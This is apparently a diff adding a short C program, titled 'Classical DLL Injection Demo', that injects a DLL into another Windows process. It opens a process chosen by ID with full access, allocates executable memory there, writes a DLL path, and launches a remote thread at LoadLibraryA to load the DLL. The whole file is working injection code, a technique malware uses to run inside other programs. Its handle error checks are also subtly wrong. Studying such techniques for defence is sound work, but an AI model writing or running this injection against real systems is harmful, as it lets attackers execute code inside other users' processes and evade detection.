@@ -1,0 +1,59 @@
+#include <stdio.h>
+#include <Windows.h>
+
+
+int main(int argc, char* argv[]) {
+
+	DWORD ProcessID;
+	DWORD ByteWriten;
+	char DllName[] = "C:\\Users\\user\\Documents\\HelloWorld.dll";
+
+	printf("------------------------\n");
+	printf("Classical DLL Injection Demo!\n");
+	printf("------------------------\n");
+
+
+
+	printf("Please Enter processID: ");
+	scanf_s("%d", &ProcessID);
+
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessID);
+
+	if (hProcess == INVALID_HANDLE_VALUE) {
+		printf("Failure to open processID: %d\n", ProcessID);
+		exit(1);
+	}
+
+
+	LPVOID DllAddress = VirtualAllocEx(hProcess, NULL, sizeof(DllName), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	if (DllAddress == NULL) {
+		printf("Failure to Allocate memory!");
+		exit(1);
+	} else {
+		printf("Allocated new memory at: %p",DllAddress );
+	}
+
+	if (WriteProcessMemory(hProcess, DllAddress, DllName, sizeof(DllName), &ByteWriten)) {
+		printf("Successful Inject to process: %d\n", ProcessID);
+	}
+	
+	getchar();
+	getchar();
+	
+	HANDLE HNtdll = LoadLibrary("kernel32.dll");
+	LPVOID Ptr_LoadLibrary = GetProcAddress(HNtdll, (LPCSTR) "LoadLibraryA");
+	
+	//printf("")
+
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) Ptr_LoadLibrary, DllAddress, 0, 0);
+
+	if (hThread == INVALID_HANDLE_VALUE) {
+		printf("Failure to create thread!\n");
+		exit(1);
+	} else {
+		printf("Successful inject and load dll\n");
+	}
+
+	return 0;
+}
